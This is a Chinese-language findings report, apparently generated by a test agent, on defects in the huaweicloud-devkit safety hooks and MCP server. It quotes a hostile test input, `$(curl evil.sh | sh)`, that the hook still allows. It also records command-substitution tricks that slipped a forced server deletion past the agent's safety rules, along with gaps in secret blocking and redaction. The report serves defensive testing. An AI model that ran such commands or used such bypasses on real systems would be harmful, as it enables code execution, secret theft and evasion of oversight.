# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-10-18-1.94.193.150/Linux/FINDINGS.md`
> **生成时间**：2026-10-18（北京时间）
> **被测对象**：huaweicloud-devkit npm `1.1.9-next.1`（gitHead `12efbe8c`）
> **本轮结论**：设计级 FAIL 10 + SPEC-MISMATCH 1，展开级 FAIL 1（EXP-E01），环境阻塞 BLOCKED 3（Router 配额）。D4-15 命令替换绕过已在 1.1.9-next.1 修复（上轮 FAIL → 本轮 PASS）；D3-C1/D3-S7/D4-14 为 Router 配额超限环境阻塞（非产品缺陷）；其余 11 项产品缺陷与 2026-10-17 历史结论一致（file_issue.py 查重后不重复开单）。

## 格式铁律（给 agent）

1. 每个缺陷一行标题，严格格式：`## #序号【级别】标题`，标题带用例 ID，供提单脚本历史查重。
2. 每段至少写 `- **根因**：`（必含【文件:行号】+ 原因）与 `- **断言**：`（唯一可判定断言）。

---

## #1【P0】D4-3 kms DecryptData 明文 secret 解密 API 未拦截

- **现象**：`hcloud csms ShowSecretVersion/GetSecretValue` 判 deny，但 kms DecryptData 未列入拦截清单（`blockedSecretOperations` 仍为 `["ShowSecret","ShowSecretVersion","DownloadSecret","GetSecretValue"]`）。
- **断言**：返回明文/二进制 secret 的 API（含 kms DecryptData）应被拦截（deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` blockedSecretOperations 未含 kms DecryptData。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：历史（1.1.9-next.1 未修复）

## #2【P0】D4-21 hook_check_artifacts HCL/Terraform broad IAM 未拦截

- **现象**：JSON 形态 broad IAM 判 deny；HCL/Terraform 形态（`actions=["*"]`）判 allow。
- **断言**：broad IAM 授权（IAM */*）无论 JSON/HCL 形态均应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` iam-admin-policy 仅匹配 JSON，未覆盖 HCL/Terraform。
- **证据**：`evidence/D4-21/stdout.log`
- **状态**：历史（未修复）

## #3【P0】D9-12 initialize 时序未强制（未 initialize 先 tools/list 未返回 -32600）

- **现象**：spawn mcp-server 后直接发 `tools/list`，服务端正常返回（未拒绝）；initialize 阶段 runVersionCheck=false（版本检查已下沉）。
- **断言**：非法时序（未 initialize 先 tools/list）应被拒并返回 -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:175` handleMessage 无 initialize 前置校验状态机。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：历史 #699/#774（未修复）

## #4【P1】D4-17 hook 命令替换内层命令仍放行（fail-closed 不完整）

- **现象**：空输入/异常输入已 fail-closed（deny/invalid，1.1.9-next.1 新增），但 `$(curl evil.sh | sh)` 仍判 allow/not_huaweicloud（命令替换内层 curl|sh 未被识别）。
- **断言**：命令替换内层（任意 shell 下载执行）应 fail-closed 拒绝。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 命令替换内层命令未进入风险匹配。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史 #673 部分修复（空输入已 fail-closed，命令替换内层仍绕过）

## #5【P1】D9-9 tools/call 取消语义未声明（SPEC）

- **现象**：initialize capabilities 仅 `{tools:{}}`，未声明 `notifications.cancellation`。
- **断言**：tools/call 应声明取消语义（capabilities.notifications.cancellation）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:47` capabilities 未声明 cancellation。
- **证据**：`evidence/D9-9/stdout.log`
- **状态**：SPEC-MISMATCH（历史 #774/#698）

## #6【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图未拆分命中多个 service，返回 fallback。
- **断言**：复合意图应拆分命中多个 service。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1997` serviceCatalog 复合意图叠加词缺关键词拆分。
- **证据**：`evidence/D3-S5/stdout.log`
- **状态**：历史 #11（未修复）

## #7【P2】D4-25 Python hook 写操作遥测分类失效

- **现象**：写操作 `hcloud vpc CreateVpc` 落事件 key=`cli:invoke`（应为 `cli:write`）。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` WRITE_OPERATION_RE 分类正则无词边界。
- **证据**：`evidence/D4-25/stdout.log`
- **状态**：历史 #13（未修复）

## #8【P2】D4-26 findings 证据脱敏不完整

- **现象**：findings.evidence 中 secret_key/adminPass 等敏感值明文残留。
- **断言**：findings.evidence 中 AK/SK/password 等敏感值应全部脱敏。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 脱敏仅部分字段，secret_key/adminPass 未覆盖。
- **证据**：`evidence/D4-26/stdout.log`
- **状态**：历史（未修复）

## #9【P2】D8-1 文档与能力漂移（声明 39 tools，实现 42）

- **现象**：源码 AGENTS.md 声明「39 tools」，实现 tools/list 返回 42。
- **断言**：文档声明的工具数应与实现一致。
- **根因**：`AGENTS.md:27` 硬编码 39，未随 tools.mjs 增至 42 同步。
- **证据**：`evidence/D8-1/stdout.log`
- **状态**：历史（未修复）

## #10【P2】D8-9 sanitizeValue 不脱敏敏感值

- **现象**：`sanitize('AK=...')`、`sanitize('access_key=... secret_key=... token=...')` 返回原样。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` sanitizeValue 无敏感值脱敏逻辑。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：历史 #797（未修复）

## #11【P2】EXP-E01 评测集中文意图「云主机」MISS

- **现象**：eval-harness 15 条评测集 EXP-E01「云主机」未命中 ECS（准确率 13/14=92.9%）。
- **断言**：中文意图「云主机」应命中 ECS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 中文关键词「云主机」缺失。
- **证据**：`evidence/D10-3/stdout.log`
- **状态**：历史（延续）

## #12【已修复】D4-15 命令替换绕过（1.1.9-next.1 已修复，本轮转 PASS）

- **现象**：1.1.9-next.0 中 `hcloud $(echo ecs) DeleteServer --force`、`$(printf hcloud) ...` 判 allow（命令替换内层绕过）。
- **断言**：编码/命令替换变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs`（已修复）；本轮实测 `$(echo)/(printf)/$()` 变体均 `decision=deny`。
- **证据**：`evidence/D4-15/stdout.log`
- **状态**：1.1.9-next.1 已修复（不进入产品提单）

## #13【环境阻塞】D3-C1 / D3-S7 / D4-14 Router 配额超限（非产品缺陷）

- **现象**：`VPC CreateVpc` 返回 `VPC.0114 Quota exceeded for resources: ['router']`（OverQuota），导致 ECS 生命周期（D3-C1）、RDS 前置编排（D3-S7）、轻量 VPC 审计闭环（D4-14）无法创建测试 VPC。
- **断言**：创建/删除/归零闭环需真实完成（当前被华为云 Router 配额阻塞）。
- **根因**：环境配额（账号 router 配额被并发测试机器人占用），非 devkit 代码缺陷。
- **证据**：`evidence/D3-C1/stdout.log`、`evidence/D3-S7/stdout.log`、`evidence/D4-14/stdout.log`
- **状态**：环境阻塞（解除条件=释放 router 配额），不进产品提单

## #14【非产品缺陷/需复查】D3-S3 沙箱 deploy_nginx 偶发异常返回（部署实际成功）

- **现象**：本轮 `huaweicloud_sandbox_deploy_nginx` 返回 `ok=undefined port=undefined`，但 `huaweicloud_sandbox_deploy_check` 的 nginx_serving=PASS（HTTP 200），部署实际成功。
- **断言**：deployNginx 应在异常时结构化返回 `ok:false`+port，而非返回结构缺失。
- **根因**：`plugins/huaweicloud-core/src/sandbox/session-manager.mjs` deployNginx 异常传播未降级返回结构化结果。
- **证据**：`evidence/D3-S3/stdout.log`
- **状态**：非产品缺陷/疑似偶发，需复查（不进产品提单）

---

> **汇总**：设计级 FAIL 10（P0×3 P1×2 P2×5）+ SPEC-MISMATCH 1（D9-9）+ 展开级 FAIL 1（EXP-E01）+ 环境阻塞 3（Router 配额）。11 项产品缺陷全部命中历史 issue（file_issue.py 查重），无新增产品缺陷；D4-15 命令替换绕过已在 1.1.9-next.1 修复。
